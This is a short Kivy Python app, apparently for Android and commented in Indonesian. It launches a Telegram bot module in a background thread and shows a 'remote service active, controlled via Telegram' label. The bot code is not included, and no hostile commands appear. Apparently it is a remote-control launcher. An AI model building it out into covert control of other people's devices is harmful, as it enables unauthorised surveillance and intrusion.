import kivy
from kivy.app import App
from kivy.uix.label import Label
import threading
import os
import sys

# Fungsi agar aplikasi punya akses folder internal yang aman
def get_path(filename):
    if sys.platform == 'android':
        from android.storage import app_storage_path
        return os.path.join(app_storage_path(), filename)
    return filename

class RemoteApp(App):
    def build(self):
        # Menjalankan bot Telegram di background agar UI tidak macet
        try:
            import bot_control
            threading.Thread(target=bot_control.start_bot, daemon=True).start()
        except Exception as e:
            print(f"Bot Error: {e}")

        return Label(text="Service Remote Aktif\nKontrol via Telegram")

if __name__ == '__main__':
    RemoteApp().run()
